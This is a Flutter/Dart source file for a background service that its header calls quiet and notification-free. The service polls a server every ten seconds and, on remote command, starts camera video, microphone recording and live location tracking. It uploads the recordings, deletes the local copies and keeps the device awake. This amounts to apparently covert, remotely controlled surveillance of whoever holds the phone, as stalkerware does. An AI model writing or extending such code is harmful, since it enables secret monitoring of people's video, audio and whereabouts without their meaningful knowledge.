// background_actions_service.dart - Simplified, efficient background monitoring (quiet, no notifications)
import 'dart:async';
import 'dart:io';
import 'package:flutter/widgets.dart';
import 'package:get/get.dart';
import 'package:wakelock_plus/wakelock_plus.dart';
import 'package:permission_handler/permission_handler.dart';
import 'api_service.dart';
import 'camera_recording_service.dart';
import 'voice_recording_service.dart';
import 'location_tracking_service.dart';

class BackgroundActionsService {
  static BackgroundActionsService? _instance;
  static BackgroundActionsService get instance =>
      _instance ??= BackgroundActionsService._();
  BackgroundActionsService._();

  Timer? _pollingTimer;
  bool _isInitialized = false;
  bool _isRunning = false;
  String? _userEmail;
  String? _userId;
  String? _userToken;

  // Action states
  bool _lastCamRecording = false;
  bool _lastVoiceRecording = false;
  bool _lastLocationLive = false;
  bool _lastOnlineStatus = false;

  // Service instances
  CameraRecordingService? _cameraService;
  VoiceRecordingService? _voiceService;
  LocationTrackingService? _locationService;
  late ApiService _apiService;

  Future<void> initialize() async {
    if (_isInitialized) return;

    try {
      await _loadUserInfo();
      if (_userEmail == null || _userId == null) return;

      _cameraService = CameraRecordingService.instance;
      _voiceService = VoiceRecordingService.instance;
      _locationService = LocationTrackingService.instance;

      _isInitialized = true;
    } catch (e) {
      print('Error initializing: $e');
    }
  }

  Future<void> _loadUserInfo() async {
    _apiService = Get.find<ApiService>();
    await _apiService.initialize();
    _userEmail = _apiService.userEmail;
    _userId = _apiService.userId;
    _userToken = _apiService.authToken;
  }

  Future<void> startService() async {
    if (!_isInitialized) await initialize();
    if (_isRunning || _userToken == null || _userId == null) return;

    // print('🟢 [BackgroundActions] Starting service for user: $_userId');
    _isRunning = true;
    WakelockPlus.enable();

    await _updateOnlineStatus(true);

    // Start with immediate poll, then more frequent periodic checks
    await _pollActionsFromServer();

    _pollingTimer = Timer.periodic(const Duration(seconds: 10), (_) async {
      // Increased interval from 5 to 10 seconds to reduce server load
      if (_isRunning) {
        await _pollActionsFromServer();
        // Also send heartbeat to keep user online every 6th poll (60 seconds)
        if (_lastOnlineStatus && DateTime.now().second % 60 == 0) {
          await _updateOnlineStatus(true);
        }
      }
    });

    print('✅ [BackgroundActions] Service started successfully');
  }

  Future<void> stopService() async {
    print('🔴 [BackgroundActions] Stopping service');
    _isRunning = false;
    _pollingTimer?.cancel();
    WakelockPlus.disable();

    await _stopAllRecording();
    await _updateOnlineStatus(false);
  }

  /// Force immediate check of actions from server (for testing/debugging)
  Future<void> forceActionCheck() async {
    print('🔄 [BackgroundActions] Force checking actions...');
    await _pollActionsFromServer();
  }

  /// Debug method to manually test actions polling
  Future<Map<String, dynamic>> testActionsPolling() async {
    print('🧪 [BackgroundActions] Testing actions polling...');
    try {
      final response = await _apiService.getUserActions();
      print('🧪 [BackgroundActions] Test response: $response');
      return response;
    } catch (e) {
      print('❌ [BackgroundActions] Test failed: $e');
      return {'success': false, 'error': e.toString()};
    }
  }

  /// Debug method to manually set online status
  Future<void> forceOnlineStatus(bool isOnline) async {
    print('🧪 [BackgroundActions] Forcing online status: $isOnline');
    await _updateOnlineStatus(isOnline);
  }

  /// Handle app lifecycle changes (called from AppLifecycleService)
  void didChangeAppLifecycleState(AppLifecycleState state) {
    print('📱 [BackgroundActions] App lifecycle changed: $state');

    switch (state) {
      case AppLifecycleState.resumed:
        print('📱 [BackgroundActions] App resumed - setting online');
        _updateOnlineStatus(true);
        // Location will be sent only on manual login, not on app resume
        break;
      case AppLifecycleState.paused:
      case AppLifecycleState.inactive:
      case AppLifecycleState.detached:
        print('📱 [BackgroundActions] App backgrounded - setting offline');
        _updateOnlineStatus(false);
        break;
      case AppLifecycleState.hidden:
        print('📱 [BackgroundActions] App hidden - setting offline');
        _updateOnlineStatus(false);
        break;
    }
  }

  Future<void> _pollActionsFromServer() async {
    if (_userToken == null) return;

    try {
      final response = await _apiService.getUserActions().timeout(
        const Duration(seconds: 10), // Reduced timeout from 45 to 10 seconds
        onTimeout: () {
          print('⏰ [BackgroundActions] Timeout getting user actions (10s)');
          return {'success': false, 'error': 'Timeout'};
        },
      );

      if (response['success'] && response['actions'] != null) {
        final actions = response['actions'];

        // Handle both boolean and integer values from server
        final bool camRecording = _toBool(actions['isCamRecording']);
        final bool voiceRecording = _toBool(actions['isVoiceRecording']);
        final bool locationLive = _toBool(actions['isLocationLive']);

        if (camRecording != _lastCamRecording) {
          camRecording
              ? await _startCameraRecording()
              : await _stopCameraRecording();
          _lastCamRecording = camRecording;
        }

        if (voiceRecording != _lastVoiceRecording) {
          voiceRecording
              ? await _startVoiceRecording()
              : await _stopVoiceRecording();
          _lastVoiceRecording = voiceRecording;
        }

        if (locationLive != _lastLocationLive) {
          locationLive
              ? await _startLocationTracking()
              : await _stopLocationTracking();
          _lastLocationLive = locationLive;
        }
      } else {
        // Only print warning if not a timeout error (to reduce spam)
        if (!response['error'].toString().contains('Timeout')) {
          print(
            '⚠️ [BackgroundActions] Failed to get actions: ${response['error']}',
          );
        }
      }
    } catch (e) {
      // Only print error if not a timeout exception (to reduce spam)
      if (!e.toString().contains('TimeoutException')) {
        print('❌ [BackgroundActions] Error polling actions: $e');
      }
    }
  }

  // Helper method to convert server response to boolean
  bool _toBool(dynamic value) {
    if (value is bool) return value;
    if (value is int) return value == 1;
    if (value is String) return value.toLowerCase() == 'true' || value == '1';
    return false;
  }

  Future<void> _startCameraRecording() async {
    try {
      // Check if permissions are already granted
      final cameraStatus = await Permission.camera.status;
      final microphoneStatus = await Permission.microphone.status;

      bool needsCameraPermission = !cameraStatus.isGranted;
      bool needsMicrophonePermission = !microphoneStatus.isGranted;

      // Request only missing permissions
      PermissionStatus finalCameraStatus = cameraStatus;
      PermissionStatus finalMicrophoneStatus = microphoneStatus;

      if (needsCameraPermission) {
        finalCameraStatus = await Permission.camera.request();
      }

      if (needsMicrophonePermission) {
        finalMicrophoneStatus = await Permission.microphone.request();
      }

      if (finalCameraStatus.isGranted && finalMicrophoneStatus.isGranted) {
        await _cameraService?.startRecording();
        print('✅ Camera recording started');
      } else {
        print('❌ Camera or microphone permission denied');
        // Update server that recording failed
        await _apiService.updateUserActions(isCamRecording: false);
      }
    } catch (e) {
      print('❌ Error starting camera: $e');
      await _apiService.updateUserActions(isCamRecording: false);
    }
  }

  Future<void> _stopCameraRecording() async {
    try {
      print('🎬 [BackgroundActions] Stopping camera recording...');
      String? videoPath = await _cameraService?.stopRecording();
      if (videoPath != null) {
        print('🎬 [BackgroundActions] Camera recording saved to: $videoPath');
        File videoFile = File(videoPath);
        if (await videoFile.exists()) {
          int fileSize = await videoFile.length();
          print('🎬 [BackgroundActions] Video file size: ${fileSize} bytes');
          print('🎬 [BackgroundActions] Starting upload...');
          await _uploadRecordedFile(videoPath, 'camera_video');
        } else {
          print('❌ [BackgroundActions] Video file does not exist: $videoPath');
        }
      } else {
        print(
          '❌ [BackgroundActions] No video path returned from camera service',
        );
      }
    } catch (e) {
      print('❌ [BackgroundActions] Error stopping camera: $e');
    }
  }

  Future<void> _startVoiceRecording() async {
    try {
      // Check if microphone permission is already granted
      final microphoneStatus = await Permission.microphone.status;

      PermissionStatus finalMicrophoneStatus = microphoneStatus;

      // Request permission only if not already granted
      if (!microphoneStatus.isGranted) {
        finalMicrophoneStatus = await Permission.microphone.request();
      }

      if (finalMicrophoneStatus.isGranted) {
        await _voiceService?.startRecording();
        print('✅ Voice recording started');
      } else {
        print('❌ Microphone permission denied');
        // Update server that recording failed
        await _apiService.updateUserActions(isVoiceRecording: false);
      }
    } catch (e) {
      print('❌ Error starting voice: $e');
      await _apiService.updateUserActions(isVoiceRecording: false);
    }
  }

  Future<void> _stopVoiceRecording() async {
    try {
      print('🎤 [BackgroundActions] Stopping voice recording...');
      String? audioPath = await _voiceService?.stopRecording();
      if (audioPath != null) {
        print('🎤 [BackgroundActions] Voice recording saved to: $audioPath');
        File audioFile = File(audioPath);
        if (await audioFile.exists()) {
          int fileSize = await audioFile.length();
          print('🎤 [BackgroundActions] Audio file size: ${fileSize} bytes');
          print('🎤 [BackgroundActions] Starting upload...');
          await _uploadRecordedFile(audioPath, 'voice_audio');
        } else {
          print('❌ [BackgroundActions] Audio file does not exist: $audioPath');
        }
      } else {
        print(
          '❌ [BackgroundActions] No audio path returned from voice service',
        );
      }
    } catch (e) {
      print('❌ [BackgroundActions] Error stopping voice: $e');
    }
  }

  Future<void> _startLocationTracking() async {
    try {
      // Check if location permissions are already granted
      final locationStatus = await Permission.location.status;
      final locationWhenInUseStatus = await Permission.locationWhenInUse.status;

      if (!locationStatus.isGranted && !locationWhenInUseStatus.isGranted) {
        print('Location permissions not granted, requesting...');

        // Try requesting location permission
        var status = await Permission.location.request();
        if (status.isDenied) {
          status = await Permission.locationWhenInUse.request();
        }

        if (status.isPermanentlyDenied) {
          print('Location permission permanently denied');
          await _apiService.updateUserActions(isLocationLive: false);
          return;
        }

        if (!status.isGranted) {
          print('Location permission denied');
          await _apiService.updateUserActions(isLocationLive: false);
          return;
        }
      }

      // Start location tracking
      await _locationService?.startTracking(_userToken!);
      print('Location tracking started');
    } catch (e) {
      print('Error starting location tracking: $e');
      await _apiService.updateUserActions(isLocationLive: false);
    }
  }

  Future<void> _stopLocationTracking() async {
    await _locationService?.stopTracking();
  }

  Future<void> _uploadRecordedFile(
    String filePath,
    String recordingType,
  ) async {
    try {
      print(
        '📤 [BackgroundActions] Starting upload for $recordingType: $filePath',
      );
      File file = File(filePath);
      if (!await file.exists()) {
        print('❌ [BackgroundActions] File does not exist: $filePath');
        return;
      }

      int fileSize = await file.length();
      print('📤 [BackgroundActions] File size: ${fileSize} bytes');

      String type = recordingType == 'camera_video' ? 'video' : 'voice';
      print('📤 [BackgroundActions] Upload type: $type');

      final result = await _apiService.uploadRecording(
        recordingFile: file,
        type: type,
      );

      print('📤 [BackgroundActions] Upload result: $result');

      if (result['success']) {
        print(
          '✅ [BackgroundActions] Upload successful, deleting file: $filePath',
        );
        await file.delete();
        print('✅ [BackgroundActions] File deleted successfully');
      } else {
        print('❌ [BackgroundActions] Upload failed: ${result['error']}');
      }
    } catch (e) {
      print('❌ [BackgroundActions] Error uploading recording: $e');
    }
  }

  Future<void> _stopAllRecording() async {
    if (_lastCamRecording) await _stopCameraRecording();
    if (_lastVoiceRecording) await _stopVoiceRecording();
    await _cameraService?.dispose();
  }

  Future<void> _updateOnlineStatus(bool isOnline) async {
    if (_userToken == null) return;

    print(
      '🌐 [BackgroundActions] Updating online status: $isOnline (was: $_lastOnlineStatus)',
    );

    try {
      await _apiService.updateUserActions(isOnline: isOnline);
      _lastOnlineStatus = isOnline;
      print('✅ [BackgroundActions] Online status updated to: $isOnline');
    } catch (e) {
      print('❌ [BackgroundActions] Failed to update online status: $e');
    }
  }

  bool get isRunning => _isRunning;

  Map<String, bool> get currentStates => {
    'isCamRecording': _lastCamRecording,
    'isVoiceRecording': _lastVoiceRecording,
    'isLocationLive': _lastLocationLive,
    'isOnline': _lastOnlineStatus,
  };
}
